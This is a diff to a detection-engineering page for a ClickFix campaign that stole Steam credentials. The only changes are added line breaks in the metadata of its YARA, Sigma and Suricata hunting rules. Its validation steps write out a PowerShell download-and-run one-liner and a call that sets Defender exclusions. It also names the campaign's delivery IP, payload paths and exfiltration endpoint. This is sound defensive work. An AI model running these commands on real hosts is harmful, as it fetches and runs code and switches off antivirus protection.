@@ -7,9 +7,13 @@ hide: true
 ---
 
 **Campaign:** Newdouble-ClickFix-202.71.14.31
+
 **Date:** 2026-09-28
+
 **Author:** The Hunters Ledger
+
 **License:** CC BY 4.0
+
 **Reference:** https://the-hunters-ledger.com/reports/newdouble-clickfix/
 
 ---
@@ -37,14 +41,23 @@ All three rules key on strings and structure that are already in the executable 
 #### Newdouble_ClickFix_SteamCDP_Loader_Strings
 
 **Tier:** Hunting
+
 **Robustness:** 2
+
 **Tier reason:** Hunting because the benign corpus checked (58,000 Windows files, no Steam install among them) cannot test the most likely benign source of these strings, so the false-positive profile is only partly characterized. See Coverage Gaps for the results.
+
 **ATT&CK Coverage:** T1185 (Browser Session Hijacking), T1041 (Exfiltration Over C2 Channel)
+
 **ATT&CK Note:** Both techniques come from strings and located functions in the executable, not from an observed run. The executable's path from local Steam data to the panel upload was not traced end to end, so T1041 is a capability mapping.
+
 **Confidence:** HIGH
+
 **False Positives:** None known. The rule requires a PE file and the log banner, or the Steam mutex-style name plus any one of the other three strings (the panel header, the panel upload path or the CEF marker file name), or three of those three panel and marker strings together. A document or analyst note that quotes these strings is not a PE and does not match.
+
 **Blind Spots:** Misses a rebuild that changes the string constants, and misses a copy whose strings are encoded or encrypted at rest. A scan of a running process only sees them once the process has decoded them, and a live process-memory scan cannot satisfy the `filesize` test at all; only a saved dump can be scanned.
+
 **Validation:** Scan the executable (SHA-256 `1366b8ca...`) and confirm a hit. Scan an ordinary Steam installation and Windows system directory and confirm no hit.
+
 **Deployment:** File scan, scan of saved dumps and retro-hunt over collected executables; review hits, do not alert or block on them. Live process-memory scanning does not match: the condition's `filesize` test is undefined there, so only files and saved dumps are scanned.
 
 ```yara
@@ -77,14 +90,23 @@ rule Newdouble_ClickFix_SteamCDP_Loader_Strings {
 #### Newdouble_ClickFix_Berserk_Embedded_DLL_PDB_Hooks
 
 **Tier:** Hunting
+
 **Robustness:** 2
+
 **Tier reason:** Hunting because the benign corpus checked (58,000 Windows files, no Steam install among them) cannot test the most likely benign source of these strings, so the false-positive profile is only partly characterized. See Coverage Gaps for the results.
+
 **ATT&CK Coverage:** None
+
 **ATT&CK Note:** The DLL is an in-game overlay and hook set for Counter-Strike 2. I am not mapping a technique to it because its hook bodies were not read and its purposes rest on the hook names.
+
 **Confidence:** HIGH
+
 **False Positives:** None known for the build-path branch: a legitimate game overlay would not carry the `berserk_gamebaker` build path. The second branch needs no path, only three of the five hook-name and localisation strings. The hook names are ordinary identifiers, and the benign corpus checked held no Steam install (see the tier reason), so this branch has an uncharacterized false-positive profile.
+
 **Blind Spots:** Misses a rebuild with a stripped debug directory and renamed hooks. Matches the outer executable as well as the carved DLL, because the DLL is stored unencoded inside it; a DLL that is stored encoded is not seen until it is decoded in memory.
+
 **Validation:** Scan the carved DLL (SHA-256 `f6afe770...`) or the outer executable and confirm a hit. Scan a game overlay or a Dear ImGui sample application and confirm no hit.
+
 **Deployment:** File scan only (the carved DLL and the outer executable on disk); The condition tests `filesize`, which is undefined in a process-memory scan, so the rule does not match there; a memory-scan form would need the `filesize` test removed and is not written or tested here. Review hits, do not alert or block on them.
 
 ```yara
@@ -118,12 +140,19 @@ rule Newdouble_ClickFix_Berserk_Embedded_DLL_PDB_Hooks {
 #### Newdouble_ClickFix_Berserk_Loader_Imphash_Or_Export
 
 **Tier:** Hunting
+
 **Robustness:** 1
+
 **ATT&CK Coverage:** None
+
 **Confidence:** MODERATE
+
 **False Positives:** Another executable built with the same toolchain and an identical import list would share the import hash, and an unrelated PE could name its export directory `BERSERK.exe`. Review hits by file size and strings before acting.
+
 **Blind Spots:** The import hash changes on any relink that alters the import list, and the export-name branch needs a builder that keeps the same module name in the export directory. A string `BERSERK.exe` elsewhere in a file does not match, by design. Neither is a durable anchor, which is why this is a scoping rule and not an alert.
+
 **Validation:** Scan the executable (SHA-256 `1366b8ca...`) and confirm a hit. Scan Windows system and program directories and confirm no hit.
+
 **Deployment:** Retro-hunt over stored executables to find rebuilds and near-copies; do not alert or block on it.
 
 ```yara
@@ -161,14 +190,23 @@ All six rules are Hunting and use `status: experimental`. Each carries an `stp.N
 #### PowerShell Launched From Explorer With Download-and-Run Script Arguments (ClickFix Run Dialog Shape)
 
 **Tier:** Hunting
+
 **Robustness:** 2
+
 **Tier reason:** Hunting because no retained baseline replay or prevalence result is cited for this rule, so its false-positive profile is uncharacterized and a benign administrator script can match it.
+
 **ATT&CK Coverage:** T1059.001 (PowerShell), T1204.004 (Malicious Copy and Paste)
+
 **ATT&CK Note:** An existing upstream rule covers the Run dialog history on registry telemetry; this rule covers the same paste on process-creation telemetry and keys on the download-save-run shape of the command, not on the operator's URL.
+
 **Confidence:** MODERATE
+
 **False Positives:** An administrator pasting a download-and-run one-liner into the Run dialog; internal onboarding instructions that tell users to paste a script bootstrap command.
+
 **Blind Spots:** The five substrings are not ordered or bound together: a command line holding them in any order matches, including one that runs a different script from the one it saved. Misses a variant that splits the download and the run into separate commands, one that uses `curl.exe` or `Start-BitsTransfer` in place of `iwr`, and any delivery in which the PowerShell process is not a child of Explorer (a terminal window opened by the victim has a different parent process). The test is Explorer parenthood and not Run-dialog provenance: a shortcut or double-click launched by Explorer with the same arguments produces the same fields and also matches.
+
 **Validation:** Paste the observed one-liner shape (`powershell -ep bypass -c "IWR <url> -OutFile $env:TEMP\x.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\x.ps1"`) into the Run dialog on a test host and confirm the rule fires on the outer process. Running the same text from an interactive PowerShell prompt must not fire it, because the parent is not `explorer.exe`.
+
 **Deployment:** Threat hunting over process-creation telemetry with the command line; not for alerting.
 
 ```yaml
@@ -226,14 +264,23 @@ level: medium
 #### Defender Path, Process and Extension Exclusions Set in One PowerShell Script Block
 
 **Tier:** Hunting
+
 **Robustness:** 2
+
 **Tier reason:** Hunting because no retained baseline replay or prevalence result is cited for this rule, so its false-positive profile is uncharacterized and a benign administrator script can match it.
+
 **ATT&CK Coverage:** T1685 (Disable or Modify Tools)
+
 **ATT&CK Note:** ATT&CK v19 revoked T1562.001 in favor of this top-level technique under the Defense Impairment tactic, so the rule tags `attack.defense-impairment` and `attack.t1685`.
+
 **Confidence:** HIGH
+
 **False Positives:** Deployment or hardening scripts that set several Defender exclusion types in one call; software installers that register their own exclusions during setup.
+
 **Blind Spots:** Needs script block logging. Misses exclusions set across separate calls, through Group Policy or the registry directly, or with abbreviated or splatted parameter names, which PowerShell accepts.
+
 **Validation:** On a test host with script block logging enabled, run `Set-MpPreference` with `-ExclusionPath`, `-ExclusionProcess` and `-ExclusionExtension` in one call and confirm the rule fires. A call that sets only one exclusion type must not fire it.
+
 **Deployment:** Threat hunting over PowerShell script block events (Microsoft-Windows-PowerShell/Operational, event 4104); not for alerting.
 
 Existing upstream rules already flag single Defender exclusions at medium severity. This rule is kept as a narrower variant: all three exclusion classes in one block is the observed first-stage pattern, and I expect it to be uncommon in legitimate administration, but I have no measurement of that.
@@ -282,12 +329,19 @@ level: medium
 #### PowerShell Writing a Script Into a Roaming Profile Subfolder
 
 **Tier:** Hunting
+
 **Robustness:** 1
+
 **ATT&CK Coverage:** T1059.001 (PowerShell)
+
 **Confidence:** LOW
+
 **False Positives:** PowerShell modules or profile scripts saved to the roaming profile by administrators; developer tooling that writes helper scripts under the roaming profile.
+
 **Blind Spots:** Misses a script copied by a different process, and any write outside the roaming profile. The subfolder test is a regex on `\AppData\Roaming\` whose case behaviour depends on the backend: the EQL conversion emits `regex~`, which is case-insensitive, so a path written in another letter case still matches there, while a backend that applies the regex case-sensitively misses it. A script written directly into the roaming folder with no subfolder does not match.
+
 **Validation:** Run `Copy-Item` from a PowerShell prompt into `%APPDATA%\SomeFolder\test.ps1` and confirm the rule fires. The same copy to `%APPDATA%\test.ps1` (no subfolder) must NOT fire.
+
 **Deployment:** Threat hunting over file-creation telemetry; not for alerting.
 
 The first-stage script copies itself to `%APPDATA%\MyApp\y.ps1` and relaunches from that copy. A rule keyed on that exact path fails as soon as the operator changes the folder name, so the exact path is in the IOC feed and this rule keys on the write pattern instead.
@@ -333,13 +387,21 @@ level: low
 #### Per-User Proxy or PAC Setting Changed by a Process Running From AppData
 
 **Tier:** Hunting
+
 **Robustness:** 1
+
 **ATT&CK Coverage:** T1557 (Adversary-in-the-Middle)
+
 **ATT&CK Note:** The executable's proxy or PAC change is a candidate capability from static analysis. The values it writes were not recovered, so the rule keys on the writer and the setting, not the data.
+
 **Confidence:** LOW
+
 **False Positives:** VPN, proxy and filtering clients installed under the user profile that manage the system proxy; developer proxy tools started from a user profile folder.
+
 **Blind Spots:** The per-user scope comes from the `HKU\` prefix, which is how Sysmon renders a per-user key (as `HKU\<SID>\...`, never as `HKCU`); a machine-wide `HKLM\...\Internet Settings` write does not match. Needs Sysmon registry monitoring on the Internet Settings key. Misses a writer that runs from outside AppData and a change made through a system API that does not pass through a monitored registry event.
+
 **Validation:** Copy a test executable into `%APPDATA%` and have it set `ProxyEnable` under the per-user Internet Settings key; confirm the rule fires. The same change made by `rundll32.exe` from System32 must not fire it.
+
 **Deployment:** Threat hunting over registry-set telemetry; not for alerting.
 
 ```yaml
@@ -386,13 +448,21 @@ level: medium
 #### Root Certificate Added to the Machine Root Store by a Process Running From AppData
 
 **Tier:** Hunting
+
 **Robustness:** 1
+
 **ATT&CK Coverage:** T1553.004 (Install Root Certificate)
+
 **ATT&CK Note:** The certificate itself, its thumbprint and its source were not recovered, so the rule keys on the writer and the store location. The executable opens the machine `ROOT` store (its own error string reads `CertOpenStore LOCAL_MACHINE\ROOT failed`), so the rule matches the `HKLM` store only and does not match a certificate added to the current user's root store. The generic upstream rule for root-store additions already exists; this rule adds the AppData-writer anchor.
+
 **Confidence:** LOW
+
 **False Positives:** Local development tools that create and trust a local certificate authority from a user profile folder; per-user installers of filtering or inspection software.
+
 **Blind Spots:** Needs Sysmon registry monitoring on the SystemCertificates key. Misses a certificate added by a system utility such as `certutil.exe`, where the writer is not in AppData, and a certificate added to the current user's root store, which is written under the user hive and is out of scope on purpose.
+
 **Validation:** Run a test executable from `%APPDATA%` that adds a certificate to the machine (LOCAL_MACHINE) Root store and confirm the rule fires. A certificate added by Group Policy must not fire it, and neither must the same executable adding a certificate to the current user's Root store.
+
 **Deployment:** Threat hunting over registry-set telemetry; not for alerting.
 
 ```yaml
@@ -434,13 +504,21 @@ level: medium
 #### Steam CEF Remote Debugging Marker File Created
 
 **Tier:** Hunting
+
 **Robustness:** 3
+
 **ATT&CK Coverage:** T1185 (Browser Session Hijacking)
+
 **ATT&CK Note:** The executable carries this filename as a static string. Successful use of the Steam debugging port was not observed, so this is a candidate capability.
+
 **Confidence:** MODERATE
+
 **False Positives:** Steam interface modding and theming tools that enable browser debugging on purpose; developers debugging Steam overlay or store pages.
+
 **Blind Spots:** Misses a driver that reaches the Steam interface without the marker file, and hosts where Steam is installed under a path the file-creation telemetry does not cover.
+
 **Validation:** Create an empty `.cef-enable-remote-debugging` file in the Steam folder and confirm the rule fires. Ordinary Steam client updates must not create it.
+
 **Deployment:** Threat hunting over file-creation telemetry, scoped to hosts where Steam is installed.
 
 The filename is defined by Steam, so it cannot be renamed while the technique works. It is Hunting rather than Detection because modding tools create the same file on purpose.
@@ -490,14 +568,23 @@ All five signatures are Hunting and use the local sids 9302101 to 9302105, which
 #### Panel Import POST With X-Vac-Secret Header
 
 **Tier:** Hunting
+
 **Robustness:** 2
+
 **Tier reason:** Hunting because the signature has never been replayed against traffic, so neither a match nor a false-positive result exists for it.
+
 **ATT&CK Coverage:** T1041 (Exfiltration Over C2 Channel)
+
 **ATT&CK Note:** The endpoint and header are static strings in the executable. A successful upload was not observed, so the mapping is a candidate capability.
+
 **Confidence:** MODERATE
+
 **False Positives:** None known, and untested against live traffic. A third-party panel that implements the same import API and header would match.
+
 **Blind Spots:** The transport scheme to the panel was not recovered. If it is HTTPS, this rule sees nothing without TLS inspection. The panel address was not recovered either, so the rule cannot be scoped to a destination.
+
 **Validation:** Send a POST to `/api/mafile/import` with an `X-Vac-Secret` header through a sensor and confirm the alert. A POST to the same path without the header must not fire it.
+
 **Deployment:** Egress HTTP inspection, or TLS-terminating proxy logs replayed through the engine; hunting only.
 
 ```
@@ -507,12 +594,19 @@ alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL HUNT newdouble-ClickFix 
 #### First-Stage Script Fetch (y.ps1 URI Path)
 
 **Tier:** Hunting
+
 **Robustness:** 1
+
 **ATT&CK Coverage:** T1105 (Ingress Tool Transfer)
+
 **Confidence:** MODERATE
+
 **False Positives:** Any internal or third-party server that serves a script at `/y/y.ps1`.
+
 **Blind Spots:** Misses HTTPS delivery and any change of path. The older template pages reference the same script name on other addresses, so this path may recur, but operator linkage across them is not established.
+
 **Validation:** Request `http://<test host>/y/y.ps1` through the sensor and confirm the alert.
+
 **Deployment:** Egress HTTP inspection; hunting only.
 
 ```
@@ -522,12 +616,19 @@ alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL HUNT newdouble-ClickFix 
 #### Second-Stage Executable Fetch (x.exe URI Path to Delivery Host)
 
 **Tier:** Hunting
+
 **Robustness:** 1
+
 **ATT&CK Coverage:** T1105 (Ingress Tool Transfer)
+
 **Confidence:** MODERATE
+
 **False Positives:** None expected while the delivery address stays with this operator; if the address is reassigned, hits become unrelated traffic.
+
 **Blind Spots:** Dies when the operator changes address. Kept as a standing signature for triage and pivoting only, and the same address and URL are in the IOC feed.
+
 **Validation:** Request `/x/x.exe` from a test host standing in for the delivery address and confirm the alert.
+
 **Deployment:** Egress HTTP inspection; hunting only.
 
 ```
@@ -537,12 +638,19 @@ alert http $HOME_NET any -> 202.71.14.31 any (msg:"THL HUNT newdouble-ClickFix S
 #### Lure Domain DNS Query (Fake Verification Page)
 
 **Tier:** Hunting
+
 **Robustness:** 1
+
 **ATT&CK Coverage:** T1204.004 (Malicious Copy and Paste)
+
 **Confidence:** MODERATE
+
 **False Positives:** None expected for the two observed domains; a lookalike registered by someone else would match the `newdouble` prefix and the `authentification.com` suffix.
+
 **Blind Spots:** Dies when the operator registers a new lure domain. The older template pages use different domains and are not covered.
+
 **Validation:** Resolve `newdoubleauthentification.com` from a test host and confirm the alert.
+
 **Deployment:** DNS inspection or resolver logs replayed through the engine; hunting only.
 
 ```
@@ -552,12 +660,19 @@ alert dns $HOME_NET any -> any any (msg:"THL HUNT newdouble-ClickFix Lure Domain
 #### Lure Domain TLS SNI (Fake Verification Page)
 
 **Tier:** Hunting
+
 **Robustness:** 1
+
 **ATT&CK Coverage:** T1204.004 (Malicious Copy and Paste)
+
 **Confidence:** MODERATE
+
 **False Positives:** Same as the DNS signature: a lookalike domain with the same prefix and suffix.
+
 **Blind Spots:** Dies when the operator registers a new lure domain. Sees nothing when the client uses Encrypted Client Hello.
+
 **Validation:** Open a TLS connection with SNI `newdoubleauthentification.com` through the sensor and confirm the alert.
+
 **Deployment:** TLS inspection; hunting only.
 
 ```
